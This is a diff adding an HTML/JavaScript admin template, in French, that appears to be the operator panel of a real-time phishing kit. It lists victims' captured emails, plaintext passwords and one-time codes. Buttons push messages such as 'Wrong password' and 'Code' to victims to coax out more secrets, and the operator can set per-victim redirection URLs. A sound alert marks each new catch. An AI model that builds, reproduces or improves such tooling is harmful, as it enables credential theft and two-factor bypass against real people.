@@ -1,0 +1,350 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin - Liste des Connexions</title>
+    <style>
+
+    /* Style for the toggle refresh button */
+    #toggle-refresh {
+        background-color: #4CAF50; /* Green background */
+        color: white; /* White text */
+        border: none; /* No border */
+        border-radius: 25px; /* Rounded corners */
+        padding: 10px 20px; /* Padding for size */
+        font-size: 16px; /* Font size */
+        font-weight: bold; /* Bold text */
+        cursor: pointer; /* Pointer cursor on hover */
+        box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1); /* Subtle shadow */
+        transition: all 0.3s ease; /* Smooth transitions */
+        margin: 10px auto; /* Centering */
+        display: block; /* Ensure button appears on its own line */
+    }
+
+    /* Hover effect */
+    #toggle-refresh:hover {
+        background-color: #45a049; /* Slightly darker green */
+        box-shadow: 0 6px 8px rgba(0, 0, 0, 0.2); /* Increase shadow on hover */
+        transform: translateY(-2px); /* Lift the button slightly */
+    }
+
+    /* Active effect (when clicking) */
+    #toggle-refresh:active {
+        background-color: red; /* Even darker green */
+        transform: translateY(1px); /* Slight downward movement */
+        box-shadow: 0 3px 5px rgba(0, 0, 0, 0.15); /* Reduce shadow */
+    }
+
+        /* Style simplifié et optimisé */
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 0;
+        }
+
+        .container {
+            width: 80%;
+            margin: 30px auto;
+            background-color: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+        }
+
+        h1 {
+            text-align: center;
+            color: #333;
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 20px 0;
+        }
+
+        table, th, td {
+            border: 1px solid #ddd;
+        }
+
+        th, td {
+            padding: 10px;
+            text-align: left;
+        }
+
+        th {
+            background-color: #4CAF50;
+            color: white;
+        }
+
+        tr:nth-child(even) {
+            background-color: #f2f2f2;
+        }
+
+        tr:hover {
+            background-color: #ddd;
+        }
+
+        .message-btn {
+            padding: 5px 10px;
+            margin: 5px;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            cursor: pointer;
+        }
+
+        .message-btn:hover {
+            background-color: #45a049;
+        }
+
+        .td-message {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+
+        .custom-input {
+            margin: 10px 0;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h1>Liste des Connexions</h1>
+
+        <!-- Affichage des connexions -->
+        <table>
+            <thead>
+                <tr>
+                    <th>ID</th>
+                    <th>Email</th>
+                    <th>Password</th>
+                    <th>Message</th>
+                    <th>Action</th>
+                    <th>Code</th>
+                </tr>
+            </thead>
+            <tbody id="connections-body">
+                {% for connection in connections %}
+                <tr>
+                    <td>{{ connection.id }}</td>
+                    <td>{{ connection.email }}</td>
+                    <td>{{ connection.password}}</td>
+                    <td class="td-message">
+                        <!-- Affichage du message et des boutons -->
+                        {{ connection.message }}
+                        <div class="custom-input">
+                            <input type="text" id="customMessageInput-{{ connection.id }}" placeholder="Enter your message" />
+                            <button class="message-btn" data-email="{{ connection.email }}" data-id="{{ connection.id }}" data-message="">Send Custom Message</button>
+                        </div>
+                        <!--<button class="message-btn" data-email="{{ connection.email }}" data-message="Wrong password">Wrong password</button>-->
+                        <!--<button class="message-btn" data-email="{{ connection.email }}" data-message="Wrong Email">Wrong Email</button>-->
+                        <!--<button class="message-btn" data-email="{{ connection.email }}" data-message="Try again...">Try again...</button>-->
+                        <!--<button class="message-btn" data-email="{{ connection.email }}" data-message="Code">Code</button>-->
+
+
+                    </td>
+                    <td>{{ connection.action }}</td>
+                </tr>
+                {% endfor %}
+            </tbody>
+        </table>
+        <button id="toggle-refresh" onclick="toggleAutoRefresh()">Enable Auto-Refresh</button>
+
+    </div>
+
+<script>
+let previousLength = 0; // Track the previous number of connections
+let autoRefreshEnabled = false; // Flag to track auto-refresh status
+let autoRefreshInterval = null; // Store the interval ID
+
+function playAudio(fileName="notification.mp3") {
+    // Construire l'URL du fichier audio dans le dossier static
+    const audioUrl = `/static/audio/${fileName}`;
+
+    // Créer un nouvel objet Audio
+    const audio = new Audio(audioUrl);
+
+    // Jouer l'audio
+    audio.play();
+
+    // Gérer la fin de l'audio
+    audio.onended = () => {
+        console.log("L'audio a fini de jouer.");
+    };
+
+    // Gestion des erreurs
+    audio.onerror = () => {
+        console.error("Erreur lors de la lecture de l'audio.");
+    };
+}
+
+// Function to send a message via POST
+function sendMessage(email, message) {
+    return fetch('/user/message', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({ email, message }),
+    }).then(response => response.json());
+}
+
+// Function to send a redirection URL via POST
+function sendRedirectionURL(email, url) {
+    return fetch(`/user/redirect`, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({ email, action: url }), // Send email and action URL
+    }).then(response => response.json());
+}
+
+// Function to refresh the connection list
+function refreshConnections(forceUpdate = false) {
+    fetch('/admin/get_all', {
+        method: 'GET',
+        headers: { 'Content-Type': 'application/json' },
+    })
+        .then(response => response.json())
+        .then(connections => {
+            if (forceUpdate || connections.length !== previousLength) {
+
+                if(!forceUpdate){
+                    playAudio()
+                }
+
+                previousLength = connections.length; // Update previous length
+
+                const tableBody = document.getElementById('connections-body');
+                tableBody.innerHTML = ''; // Clear the table before adding new rows
+
+                connections.forEach(conn => {
+                    const row = document.createElement('tr');
+                    row.innerHTML = `
+                        <td>${conn.id}</td>
+                        <td>${conn.email}</td>
+                        <td>${conn.password}</td>
+                        <td class="td-message">
+                            ${conn.message}
+                            <div class="custom-input">
+                                <input type="text" id="customMessageInput-${conn.id}" placeholder="Enter your message" />
+                                <button class="message-btn" data-email="${conn.email}" data-id="${conn.id}" data-message="">Send Custom Message</button>
+                            </div>
+
+
+
+                            <!--<button class="message-btn" data-email="${conn.email}" data-message="Mot de passe incorrect">Mot de passe incorrect</button>-->
+                            <!--<button class="message-btn" data-email="${conn.email}" data-message="Adresse e-mail incorrecte">Adresse e-mail incorrecte</button>-->
+                            <!--<button class="message-btn" data-email="${conn.email}" data-message="Try again...">Try again...</button>-->
+                            <!--<button class="message-btn" data-email="${conn.email}" data-message="Code">Code</button>-->
+
+                        <button class="message-btn" data-email="${conn.email}" data-message="Wrong password">Wrong password</button>
+                        <button class="message-btn" data-email="${conn.email}" data-message="Wrong Email">Wrong Email</button>
+                        <button class="message-btn" data-email="${conn.email}" data-message="Try again...">Try again...</button>
+                        <button class="message-btn" data-email="${conn.email}" data-message="Code">Code</button>
+
+                        </td>
+                        <td>
+                            ${conn.action ? `<a href="${conn.action}" target="_blank">${conn.action}</a>` : ''}
+                            <input type="text" id="actionInput-${conn.id}" placeholder="Enter URL for redirection" />
+                            <button class="action-btn" data-email="${conn.email}" data-id="${conn.id}">Set Redirection URL</button>
+                        </td>
+                        <td>${conn.code}</td>
+                    `;
+                    tableBody.appendChild(row);
+                });
+            }
+        })
+        .catch(error => {
+            console.error('Error while refreshing connections:', error);
+        });
+}
+
+// Use event delegation to dynamically handle button clicks
+document.addEventListener('click', function (event) {
+    if (event.target.classList.contains('message-btn')) {
+        const button = event.target;
+        const email = button.getAttribute('data-email');
+        const messageId = button.getAttribute('data-id');
+        let message = button.getAttribute('data-message');
+        const customMessageInput = document.getElementById(`customMessageInput-${messageId}`);
+
+        if (customMessageInput && customMessageInput.value) {
+            // If a custom message is provided, override the default message
+            message = customMessageInput.value;
+        }
+
+        sendMessage(email, message)
+            .then(data => {
+                if (data.success) {
+                    refreshConnections(true); // Refresh the table on success
+                } else {
+                    alert('Error updating the message.');
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                alert('An error occurred while sending the message.');
+            });
+    }
+
+    if (event.target.classList.contains('action-btn')) {
+        const button = event.target;
+        const email = button.getAttribute('data-email');
+        const actionId = button.getAttribute('data-id');
+        const actionInput = document.getElementById(`actionInput-${actionId}`);
+
+        if (actionInput && actionInput.value) {
+            const url = actionInput.value;
+
+            // Send the redirection URL
+            sendRedirectionURL(email, url)
+                .then(data => {
+                    if (data.success) {
+                        refreshConnections(true); // Refresh the table on success
+                    } else {
+                        alert('Error setting redirection URL.');
+                    }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    alert('An error occurred while setting the redirection URL.');
+                });
+        }
+    }
+});
+
+// Toggle auto-refresh when the button is clicked
+function toggleAutoRefresh() {
+    autoRefreshEnabled = !autoRefreshEnabled;
+
+    const toggleButton = document.getElementById('toggle-refresh');
+    if (autoRefreshEnabled) {
+        toggleButton.textContent = 'Is Enable';
+        autoRefreshInterval = setInterval(() => refreshConnections(true), 5000); // Force update every 5 seconds
+    } else {
+        toggleButton.textContent = 'Enable Auto-Refresh';
+        clearInterval(autoRefreshInterval); // Stop automatic updates
+    }
+}
+
+// Initial fetch to populate the list
+refreshConnections();
+
+// Automatically refresh the list periodically (if enabled)
+setInterval(() => {
+    if (!autoRefreshEnabled) {
+        refreshConnections(); // Only check for updates if auto-refresh is disabled
+    }
+}, 1000);
+
+
+</script>
+
+</body>
+</html>
